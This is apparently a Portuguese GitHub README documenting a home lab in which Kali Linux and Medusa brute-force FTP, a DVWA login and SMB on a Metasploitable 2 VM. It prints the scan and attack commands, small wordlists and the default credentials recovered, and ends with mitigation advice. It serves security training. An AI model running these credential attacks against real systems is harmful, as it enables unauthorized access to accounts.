# 🔐 Brute Force Lab com Kali Linux e Medusa

![Kali Linux](https://img.shields.io/badge/Kali-Linux-268BEE?style=for-the-badge&logo=kalilinux&logoColor=white)
![Cyber Security](https://img.shields.io/badge/Cyber-Security-red?style=for-the-badge)
![Linux](https://img.shields.io/badge/Linux-Terminal-black?style=for-the-badge&logo=linux)
![VirtualBox](https://img.shields.io/badge/VirtualBox-183A61?style=for-the-badge&logo=virtualbox)

---

#Sobre o Projeto

Este projeto foi desenvolvido com o objetivo de estudar ataques de força bruta em ambientes controlados utilizando Kali Linux e a ferramenta Medusa.

Foram realizados testes em serviços vulneráveis utilizando máquinas virtuais configuradas em laboratório local.

Projeto realizado exclusivamente para fins educacionais.

---

# Objetivos

- Compreender ataques de força bruta
- Utilizar Kali Linux em auditoria de segurança
- Aprender enumeração de serviços
- Simular ataques em FTP, DVWA e SMB
- Documentar vulnerabilidades
- Aplicar recomendações de mitigação

---

# Ambiente Utilizado

| Máquina | Sistema Operacional | IP |
|---|---|---|
| Máquina atacante | Kali Linux | 192.168.56.101 |
| Máquina vulnerável | Metasploitable 2 | 192.168.56.102 |

Rede utilizada:
- Host-Only Adapter (VirtualBox)

---

#Ferramentas Utilizadas

- Kali Linux
- Medusa
- Nmap
- Enum4Linux
- DVWA
- VirtualBox
- Metasploitable 2

---

# Enumeração Inicial

Inicialmente foi realizado um escaneamento utilizando Nmap para identificar serviços ativos.

## Comando

```bash
nmap -sV 192.168.56.102
```

## Serviços Encontrados

- FTP
- SMB
- HTTP
- SSH
- Telnet

---

# Ataque de Força Bruta em FTP

## Objetivo

Testar credenciais fracas no serviço FTP.

## Wordlist utilizada

Arquivo:

```txt
wordlists/senhas.txt
```

## Comando Executado

```bash
medusa -h 192.168.56.102 -u msfadmin -P wordlists/senhas.txt -M ftp
```

## Resultado

Credenciais válidas encontradas:

| Usuário | Senha |
|---|---|
| msfadmin | msfadmin |



# Ataque em Formulário Web (DVWA)

## Objetivo

Automatizar tentativas de login em aplicação vulnerável.

## Comando Utilizado

```bash
medusa -h 192.168.56.102 -u admin -P wordlists/senhas.txt -M http
```

## Resultado

Credenciais válidas identificadas:

| Usuário | Senha |
|---|---|
| admin | password |



# Password Spraying em SMB

## Enumeração de Usuários

Antes do ataque SMB foi utilizada enumeração de usuários.

## Comando

```bash
enum4linux 192.168.56.102
```

## Ataque SMB

```bash
medusa -h 192.168.56.102 -U wordlists/usuarios.txt -p senha123 -M smbnt
```

## Resultado

Usuário válido identificado com sucesso.


# Wordlists Utilizadas

## senhas.txt

```txt
123456
password
admin
root
toor
msfadmin
senha123
qwerty
```

## usuarios.txt

```txt
admin
root
user
msfadmin
guest
```

---

# Recomendações de Mitigação

Durante os testes foi possível identificar vulnerabilidades relacionadas a senhas fracas.

## Medidas recomendadas:

- Implementação de MFA
- Política de senhas fortes
- Limitação de tentativas de login
- Monitoramento de logs
- Desativação de serviços desnecessários
- Atualização constante de sistemas
- Bloqueio automático por tentativas consecutivas

---

# Aprendizados

Este projeto permitiu compreender:

- Técnicas de brute force
- Enumeração de serviços
- Funcionamento do Medusa
- Vulnerabilidades comuns
- Importância da segurança defensiva
- Criação de ambientes de laboratório

# Aviso Legal

Este projeto foi desenvolvido exclusivamente em ambiente controlado e para fins educacionais.

O uso indevido dessas ferramentas contra sistemas sem autorização é ilegal.

---

# 👨‍💻 Autor

Carlos Daniel

